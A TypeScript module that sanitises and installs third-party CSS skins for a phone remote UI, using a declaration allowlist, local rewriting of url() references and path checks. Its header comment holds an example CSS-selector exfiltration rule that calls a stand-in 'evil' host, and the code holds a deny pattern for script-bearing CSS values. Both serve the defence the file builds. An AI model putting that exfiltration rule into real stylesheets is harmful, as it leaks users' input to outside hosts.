// remote-skins.ts — fetch, sanitise, cache and serve skins that are NOT in the
// phone bundle (PRD 2026-07-23-1784771137, Phase: remote skins).
//
// WHY THIS EXISTS: adding a skin used to mean a CSS block, a union member, and
// an app release. The catalog endpoint decouples the last one — new paint ships
// without shipping a binary.
//
// ── The threat, stated precisely ────────────────────────────────────────────
// Third-party CSS injected into the remote UI can exfiltrate state WITHOUT any
// JavaScript, because a matching selector makes the browser fetch a URL:
//
//   input[value^='a'] { background: url(https://evil/?c=a) }
//
// A rule per character leaks the field a request at a time. The same trick
// reads which prefs are active, whether recording is on, and so on. Proxying
// those requests through our own backend does NOT help: the signal is that the
// request fired at all, readable from proxy logs or from timing.
//
// ── The two defences, and why both are needed ───────────────────────────────
// 1. DECLARATION ALLOWLIST. Only `--pro-*` custom properties survive, and only
//    inside a `[data-skin]` block. Everything else — every ordinary property,
//    @import, @media, bare selectors — is dropped. This is not a blocklist of
//    dangerous constructs (those get bypassed by the encoding you didn't think
//    of); it is a list of the ~40 declarations a skin is DEFINED as, per
//    react/SKINS.md. Anything unrecognised is discarded rather than inspected.
//
// 2. URL REWRITING, not URL banning. A blanket url() ban would kill legitimate
//    skin art — Pro II's cork deck is exactly that. Instead every url() must
//    name a file the manifest declared in `assets`; we download those once at
//    install and rewrite the reference to the local re-serving path. A url()
//    pointing anywhere else is dropped. After install the phone makes ZERO
//    outbound requests for a skin, so defence 1's residual risk (a --pro-* var
//    holding a url, which is legal CSS) has nowhere to send anything.
//
// Net effect: an installed skin is a bag of colours plus locally-hosted images.
// That is the same authority a built-in skin has.

import { mkdirSync, readFileSync, writeFileSync, existsSync, rmSync, readdirSync } from 'fs'
import { join } from 'path'
import { PATHS } from '../store/paths'
import { CONFIG } from '../../shared/config'
import {
  REMOTE_SKIN_PREFIX,
  remoteSkinCatalogId,
  type RemoteSkinCatalog,
  type RemoteSkinManifestEntry
} from '../../shared/types'
import { devLog } from '../../shared/env'

/** Custom properties a skin may set. Matches the token surface documented in
 *  react/SKINS.md — the `--pro-` prefix IS the contract, so a new token added
 *  to theme.css is automatically skinnable with no change here. */
const ALLOWED_DECL_RE = /^--pro-[a-z0-9-]+$/

/** A declaration VALUE may hold: colours, numbers, units, and a handful of CSS
 *  functions. Anything with a semicolon, brace, or `@` is rejected outright —
 *  those are the characters that let a value escape into a new rule. */
const VALUE_FORBIDDEN_RE = /[;{}@\\]|<\/|javascript:|expression\s*\(|behaviou?r\s*:|-moz-binding/i

/** url(...) inside a declaration value. Quotes optional, per CSS. */
const URL_FN_RE = /url\(\s*(['"]?)([^'")]+)\1\s*\)/gi

/** Asset filenames are re-served from disk, so the charset is as narrow as the
 *  skin id's: no separators, no traversal, one dot for the extension. */
const ASSET_NAME_RE = /^[a-z0-9-]{1,48}\.(webp|png|jpg|jpeg|avif|svg)$/i

/** Hard ceilings. A skin is ~120 lines of tokens; these are ~50x that, so they
 *  only bite on something pathological, and they bound both the download and
 *  what a malformed catalog can make us write to disk. */
const MAX_CSS_BYTES = 256 * 1024
const MAX_ASSET_BYTES = 4 * 1024 * 1024
/** One per skinnable region, not a round number: package.py emits 11 (deck, pad,
 *  mic, 4 keys, 3 icons, mark) and every one is load-bearing. The old ceiling of
 *  8 truncated silently — the pad, tab key and switcher icon lost their art
 *  while install still reported success. */
const MAX_ASSETS_PER_SKIN = 16
const FETCH_TIMEOUT_MS = 10_000

/** Where installed skins live: <ROOT>/skins/<catalogId>/{skin.css,manifest.json,assets}. */
function skinDir(catalogId: string): string {
  return join(PATHS.REMOTE_SKINS_DIR, catalogId)
}

export interface InstalledRemoteSkin {
  /** Prefixed id, ready to persist or send over the wire. */
  id: string
  catalogId: string
  label: string
  blurb: string
  lightOnly: boolean
  /** Sanitised CSS, url()s already rewritten to local paths. */
  css: string
  /** Written by hand, not fetched — so the catalog never speaks for it.
   *
   *  The store's reconcile retires any installed skin the catalog no longer
   *  offers, which is right for a withdrawn skin and wrong for one the catalog
   *  never offered: a locally-installed skin is absent from every catalog by
   *  definition, so the first store open deleted it (skin experiment,
   *  2026-07-24 — installed, then gone before it could be worn).
   *
   *  Absent on a fetched skin, so the flag reads false for everything the
   *  catalog installed and no existing manifest needs rewriting. */
  local?: boolean
  /** Paints its surfaces with pictures instead of the token sculpt, so the deck
   *  must stamp `data-img-skin` and tear the sculpt out from under them.
   *
   *  Carried on the manifest rather than hardcoded in the client's IMAGE_SKINS
   *  set, which is where it used to live: one `'remote:<run>'` line per run,
   *  edited by hand and rebuilt, for a value the packager already knew
   *  (entry.json has emitted `imageSkin` all along).
   *
   *  Honoured for fetched skins as well as local ones: region art travels as
   *  `--pro-*-img: url(...)`, which survives sanitising as a rewritten local
   *  path (defence 2 in the header). */
  imageSkin?: boolean
}

/**
 * Strip a third-party stylesheet down to what a skin is allowed to be.
 *
 * Returns CSS containing exactly one rule — `.proRoot[data-skin='<id>'] { … }` —
 * built from scratch out of the declarations that survived. We never re-emit
 * the author's selectors or structure, which is what makes this an allowlist:
 * unparsed input cannot flow through to the output.
 *
 * Exported for tests; install() is the normal entry point.
 */
export function sanitizeRemoteSkinCss(
  rawCss: string,
  opts: { catalogId: string; allowedAssets: readonly string[]; assetPathBase: string }
): { css: string; dropped: string[] } {
  const dropped: string[] = []
  const declarations: string[] = []
  const seen = new Set<string>()

  // Comments can hide a `}` and desync any brace-counting we do below, so they
  // go first. This is why we parse declarations rather than trusting structure.
  const withoutComments = rawCss.replace(/\/\*[\s\S]*?\*\//g, ' ')

  for (const chunk of withoutComments.split(';')) {
    const idx = chunk.indexOf(':')
    if (idx === -1) continue

    // Strip any leading selector/brace noise — we only care about the property
    // name immediately preceding the colon.
    const rawProp = chunk.slice(0, idx)
    const prop = rawProp.slice(rawProp.lastIndexOf('{') + 1).trim()
    const value = chunk.slice(idx + 1).trim()

    if (!ALLOWED_DECL_RE.test(prop)) {
      if (prop) dropped.push(prop)
      continue
    }
    if (!value || VALUE_FORBIDDEN_RE.test(value)) {
      dropped.push(`${prop} (unsafe value)`)
      continue
    }

    // Rewrite every url() to a local path, or drop the whole declaration if it
    // names an asset the manifest never declared.
    let unresolved = false
    const rewritten = value.replace(URL_FN_RE, (_match, _quote, target: string) => {
      const name = target.trim()
      if (!opts.allowedAssets.includes(name)) {
        unresolved = true
        return ''
      }
      return `url('${opts.assetPathBase}/${name}')`
    })
    if (unresolved) {
      dropped.push(`${prop} (undeclared asset)`)
      continue
    }

    // Last-wins, matching the CSS cascade, so a skin can't bloat the output by
    // repeating a token.
    if (seen.has(prop)) {
      declarations[declarations.findIndex((d) => d.startsWith(`${prop}:`))] = `${prop}: ${rewritten}`
    } else {
      seen.add(prop)
      declarations.push(`${prop}: ${rewritten}`)
    }
  }

  if (declarations.length === 0) return { css: '', dropped }

  // The selector is OURS, built from an id already validated against
  // REMOTE_SKIN_ID_RE — so no author-controlled text reaches the selector.
  const skinSelector = `.proRoot[data-skin='${REMOTE_SKIN_PREFIX}${opts.catalogId}']`
  const body = declarations.map((d) => `  ${d};`).join('\n')

  // The bottom strip, lifted to <html>.
  //
  // iOS can leave a band below the visible viewport that no element inside
  // .proRoot paints (see theme.css, the html,body rule). The page underneath
  // wears --pro-strip so the seam has nothing to show. A built-in skin sets
  // that with a `html:has(...)` rule of its own, but a REMOTE skin can't: the
  // allowlist above only emits `--pro-*` declarations, and custom properties
  // inherit down, never up — so a value declared on .proRoot is invisible to
  // its own ancestors.
  //
  // Hence this second rule. It re-declares the skin's chosen strip colour on a
  // box the page can actually inherit from, preferring an explicit --pro-strip
  // and falling back to --pro-card (the element adjacent to the seam; the deck
  // colour reads as a visible band). Both values already survived the
  // allowlist and the url()/value checks above, and the selector is still ours
  // — so this adds no new trust, only a new place to put a vetted colour.
  // `:not(.skinPreview)` because a store card mounts a REAL .proRoot wearing this
  // skin. Unscoped, opening the store repaints the whole page in whichever card's
  // colour sorted last — the strip rule is the one selector here that escapes the
  // deck's subtree, so it is the one that has to say which .proRoot it means.
  const stripValue = pickDeclaredValue(declarations, ['--pro-strip', '--pro-card'])
  const stripRule = stripValue
    ? `html:has(.proRoot:not(.skinPreview)[data-skin='${REMOTE_SKIN_PREFIX}${opts.catalogId}']) {\n  --pro-strip: ${stripValue};\n}\n`
    : ''

  return {
    css: `${skinSelector} {\n${body}\n}\n${stripRule}`,
    dropped
  }
}

/** First of `props` that the skin actually declared, in preference order. */
function pickDeclaredValue(declarations: readonly string[], props: readonly string[]): string | null {
  for (const prop of props) {
    const hit = declarations.find((d) => d.startsWith(`${prop}:`))
    if (hit) return hit.slice(prop.length + 1).trim()
  }
  return null
}

/** Fetch with a timeout. Node's fetch has no default one, and a catalog that
 *  accepts the connection then stalls would hang the store sheet open. */
async function fetchWithTimeout(url: string, accept: string): Promise<Response> {
  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS)
  try {
    return await fetch(url, { signal: controller.signal, headers: { Accept: accept } })
  } finally {
    clearTimeout(timer)
  }
}

/**
 * Read the catalog. Called ONLY when the phone opens the skin store — never on
 * connect, never on a timer. That is a privacy property, not an optimisation:
 * a fetch on connect would tell the catalog host that a MightyMouse device came
 * online every time one did, which is the phone-home the skin PRD ruled out.
 */
export async function fetchRemoteSkinCatalog(): Promise<RemoteSkinCatalog | null> {
  try {
    const res = await fetchWithTimeout(CONFIG.PHONE_REMOTE.SKIN_CATALOG_URL, 'application/json')
    if (!res.ok) {
      devLog.warn('[remote-skins] catalog HTTP', res.status)
      return null
    }
    const body = (await res.json()) as RemoteSkinCatalog
    if (!body || !Array.isArray(body.skins) || typeof body.assetBaseUrl !== 'string') {
      devLog.warn('[remote-skins] catalog shape rejected')
      return null
    }
    if (!body.assetBaseUrl.startsWith('https://')) {
      devLog.warn('[remote-skins] catalog assetBaseUrl not https')
      return null
    }
    return body
  } catch (err) {
    // The store must open and work offline; a dead catalog is a missing
    // section, never an error the user has to dismiss.
    devLog.warn('[remote-skins] catalog fetch failed:', err)
    return null
  }
}

/**
 * Install one catalog entry: sanitise its CSS, download its declared assets,
 * write both under <ROOT>/skins/<id>/. Idempotent — a reinstall overwrites.
 */
export async function installRemoteSkin(
  entry: RemoteSkinManifestEntry,
  assetBaseUrl: string
): Promise<InstalledRemoteSkin | null> {
  const catalogId = entry.id
  const assets = (entry.assets ?? []).filter((a) => ASSET_NAME_RE.test(a))

  // Refuse an over-budget skin rather than truncating to the ceiling. Silently
  // keeping the first N leaves the rest undeclared, so the sanitiser drops those
  // declarations and the skin installs half-painted while install reports
  // success — the failure surfaces as blank regions on the phone, nowhere near
  // the cause.
  if (assets.length > MAX_ASSETS_PER_SKIN) {
    devLog.warn('[remote-skins] too many assets:', catalogId, assets.length, '>', MAX_ASSETS_PER_SKIN)
    return null
  }

  if (typeof entry.css !== 'string' || entry.css.length > MAX_CSS_BYTES) {
    devLog.warn('[remote-skins] css missing or too large:', catalogId)
    return null
  }

  const { css, dropped } = sanitizeRemoteSkinCss(entry.css, {
    catalogId,
    allowedAssets: assets,
    // Served by server.ts's static handler; see REMOTE_SKIN_ASSET_ROUTE.
    assetPathBase: `${CONFIG.PHONE_REMOTE.REMOTE_SKIN_ASSET_ROUTE}/${catalogId}`
  })
  if (dropped.length > 0) devLog.warn('[remote-skins] dropped from', catalogId, dropped)
  if (!css) {
    devLog.warn('[remote-skins] nothing survived sanitising:', catalogId)
    return null
  }

  const dir = skinDir(catalogId)
  try {
    mkdirSync(dir, { recursive: true })

    for (const name of assets) {
      const res = await fetchWithTimeout(`${assetBaseUrl.replace(/\/$/, '')}/${catalogId}/${name}`, 'image/*')
      if (!res.ok) {
        devLog.warn('[remote-skins] asset HTTP', res.status, name)
        return null
      }
      const buf = Buffer.from(await res.arrayBuffer())
      if (buf.byteLength > MAX_ASSET_BYTES) {
        devLog.warn('[remote-skins] asset too large:', name)
        return null
      }
      writeFileSync(join(dir, name), buf)
    }

    // Claiming imageSkin is not enough to be one: the flag tears the sculpt out
    // from under the deck, so a skin whose art didn't survive sanitising would
    // paint nothing back. Confirm the CSS actually carries region images before
    // honouring it — that keeps a malformed or half-dropped catalog entry from
    // installing as a blank deck.
    const hasRegionArt = /--pro-[a-z0-9-]+-img:\s*url\(/i.test(css)
    if (entry.imageSkin === true && !hasRegionArt) {
      devLog.warn('[remote-skins] imageSkin claimed but no region art survived:', catalogId)
    }

    const installed: InstalledRemoteSkin = {
      id: `${REMOTE_SKIN_PREFIX}${catalogId}`,
      catalogId,
      label: entry.label,
      blurb: entry.blurb ?? '',
      lightOnly: entry.lightOnly === true,
      imageSkin: entry.imageSkin === true && hasRegionArt,
      css
    }
    writeFileSync(join(dir, 'skin.css'), css, 'utf-8')
    writeFileSync(join(dir, 'manifest.json'), JSON.stringify(installed), 'utf-8')
    return installed
  } catch (err) {
    devLog.warn('[remote-skins] install failed:', catalogId, err)
    return null
  }
}

/** Every skin currently on disk. Read at server start so an installed skin
 *  paints on the first frame, exactly like a built-in one. */
export function listInstalledRemoteSkins(): InstalledRemoteSkin[] {
  if (!existsSync(PATHS.REMOTE_SKINS_DIR)) return []
  const out: InstalledRemoteSkin[] = []
  for (const dirent of readdirSync(PATHS.REMOTE_SKINS_DIR, { withFileTypes: true })) {
    if (!dirent.isDirectory()) continue
    try {
      const raw = readFileSync(join(PATHS.REMOTE_SKINS_DIR, dirent.name, 'manifest.json'), 'utf-8')
      const parsed = JSON.parse(raw) as InstalledRemoteSkin
      // Re-sanitising on read would be belt-and-braces, but the file is ours
      // and inside the app's own data dir; trusting it is the same trust we
      // already place in every other pref file.
      if (parsed?.id && parsed.css) out.push(parsed)
    } catch {
      // A half-written skin dir is skipped, not fatal.
    }
  }
  return out
}

/** Display name of ONE installed remote skin, or null if it isn't installed.
 *
 *  Reads a single manifest rather than going through listInstalledRemoteSkins:
 *  the caller wants the name of the skin being WORN, and scanning every skin
 *  dir to answer for one of them is work proportional to a collection when the
 *  question is about a single item.
 *
 *  Exists because a remote skin's label lives only on disk. The phone compiles
 *  in the built-ins' labels but learns a remote one from the catalog, which is
 *  fetched only when the store is deliberately opened — so a phone wearing a
 *  remote skin could not name it at first paint. */
export function remoteSkinLabel(skinId: string): string | null {
  // Runs during a WS upgrade now, where a throw kills the connection.
  if (typeof skinId !== 'string') return null
  const catalogId = remoteSkinCatalogId(skinId)
  if (!catalogId) return null
  try {
    const raw = readFileSync(join(skinDir(catalogId), 'manifest.json'), 'utf-8')
    const parsed = JSON.parse(raw) as Partial<InstalledRemoteSkin>
    return typeof parsed?.label === 'string' && parsed.label !== '' ? parsed.label : null
  } catch {
    // Uninstalled, half-written, or unreadable. The caller renders the skin
    // without a name rather than failing.
    return null
  }
}

/** Absolute path to an installed asset, or null if the id/name is malformed or
 *  absent. The ONLY sanctioned way to turn a request path into a file path —
 *  both segments are re-validated here so a traversal can't reach the fs. */
export function resolveRemoteSkinAsset(catalogId: string, name: string): string | null {
  if (!/^[a-z0-9-]{1,32}$/.test(catalogId)) return null
  if (!ASSET_NAME_RE.test(name)) return null
  const path = join(skinDir(catalogId), name)
  return existsSync(path) ? path : null
}

/** Remove an installed skin. */
export function uninstallRemoteSkin(catalogId: string): void {
  if (!/^[a-z0-9-]{1,32}$/.test(catalogId)) return
  try {
    rmSync(skinDir(catalogId), { recursive: true, force: true })
  } catch (err) {
    devLog.warn('[remote-skins] uninstall failed:', catalogId, err)
  }
}
